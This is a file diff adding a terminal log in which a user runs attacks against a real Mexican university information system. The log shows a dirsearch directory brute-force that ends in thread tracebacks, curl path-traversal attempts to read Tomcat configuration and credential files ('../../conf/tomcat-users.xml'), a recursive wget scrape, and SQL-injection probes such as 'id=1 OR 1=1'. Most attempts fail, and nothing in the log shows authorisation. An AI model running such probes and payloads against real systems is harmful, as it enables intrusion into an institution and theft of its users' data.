@@ -1,0 +1,115 @@
+Target: https://sito.utslp.edu.mx/
+
+[07:24:51] Starting: jsp/                                                    
+[07:24:55] 302 -    0B  - /jsp/img  ->  https://sito.utslp.edu.mx/jsp/img/  
+[07:25:01] 302 -    0B  - /jsp/cc  ->  https://sito.utslp.edu.mx/jsp/cc/    
+[07:25:02] 302 -    0B  - /jsp/js  ->  https://sito.utslp.edu.mx/jsp/js/    
+[07:25:24] 302 -    0B  - /jsp/servicios  ->  https://sito.utslp.edu.mx/jsp/servicios/
+[##                  ] 10%   9325/87649       132/s       job:1/1  errors:0^X[07:25:46] 302 -    0B  - /jsp/ingles  ->  https://sito.utslp.edu.mx/jsp/ingles/
+[###                 ] 18%  16106/87649       226/s       job:1/1  errors:0^[[07:26:32] 400 -    0B  - /jsp/http%3A%2F%2Fwww                             
+[###############     ] 78%  69078/87649         0/s       job:1/1  errors:127Exception in thread Thread-22 (thread_proc):
+Exception in thread Thread-35 (thread_proc):
+Exception in thread Thread-19 (thread_proc):
+Exception in thread Thread-28 (thread_proc):
+Exception in thread Thread-30 (thread_proc):
+Exception in thread Thread-31 (thread_proc):
+Traceback (most recent call last):
+Exception in thread Thread-23 (thread_proc):
+Traceback (most recent call last):
+Traceback (most recent call last):
+Exception in thread Thread-18 (thread_proc):
+Exception in thread Thread-17 (thread_proc):
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc                                                                                                                                                                  
+    self.scan(self._base_path + path, scanners)
+    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc                                                                                                                                                                  
+    self.scan(self._base_path + path, scanners)
+    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Exception in thread Thread-13 (thread_proc):
+Traceback (most recent call last):
+Exception in thread Thread-15 (thread_proc):
+  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc                                                                                                                                                                  
+    self.scan(self._base_path + path, scanners)
+    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Traceback (most recent call last):
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 168, in scan
+    response = self._requester.request(path)
+  File "/usr/lib/python3/dist-packages/dirsearch/lib/connection/requester.py", line 222, in request
+    raise RequestException(err_msg)
+
+
+                                                                                         
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ 
+curl -k "https://sito.utslp.edu.mx/jsp/include.jsp?page=../../conf/tomcat-users.xml"
+curl: (6) Could not resolve host: sito.utslp.edu.mx
+                                                                                         
+┌──(marco-os㉿Marco-Antonio)-[~]
+└─$ curl -k "https://sito.utslp.edu.mx/jsp/config.jsp?file=../../conf/context.xml"
+
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Informaci�n T�ctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+        <br>
+        <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+                  <th class="CeldaDatosTitulo"> Error 404</th>
+        </table>
+        <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+                <colgroup>
+                        <col width="20%"> <col width="80%">
+                </colgroup>
+                <tr class="CeldaDatos">
+                        <td colspan="2">&nbsp;  </td>
+                </tr>
+                <tr class="CeldaDatos">
+                        <td align="center"> <img src="/images/error404.png"> </td>
+                        <td><b> Error 404, p�gina no encontrada, por favor reportarlo al departamento de Sistemas Inform�ticos</b></td>
+                </tr>
+                <tr class="CeldaDatos">
+                        <td colspan="2">&nbsp;  </td>
+                </tr>
+        </table>
+</form>
+</body>
+</html>                                                                                         
+┌──(marco
+
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/wgets]
+└─$ 
+wget -r -l2 -A "*.js" https://sito.utslp.edu.mx/javascript/
+--2025-10-09 07:44:31--  https://sito.utslp.edu.mx/javascript/
+Resolviendo sito.utslp.edu.mx (sito.utslp.edu.mx)... 189.254.143.102
+Conectando con sito.utslp.edu.mx (sito.utslp.edu.mx)[189.254.143.102]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 302 Movido temporalmente
+Localización: https://sito.utslp.edu.mx/javascript/acceso_denegado.jsp;jsessionid=A173D4760A9D88FF0B675F65698D3C80 [siguiendo]
+--2025-10-09 07:44:34--  https://sito.utslp.edu.mx/javascript/acceso_denegado.jsp;jsessionid=A173D4760A9D88FF0B675F65698D3C80
+Reutilizando la conexión con sito.utslp.edu.mx:443.
+Petición HTTP enviada, esperando respuesta... 404 No Encontrado
+2025-10-09 07:44:34 ERROR 404: No Encontrado.
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/wgets]
+└─$ curl -k "https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?id=1 OR 1=1" 
+curl: (3) URL rejected: Malformed input to a URL function
+                                                                                         
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/wgets]
+└─$ curl -k "https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?user=admin"
+curl: (6) Could not resolve host: sito.utslp.edu.mx
+
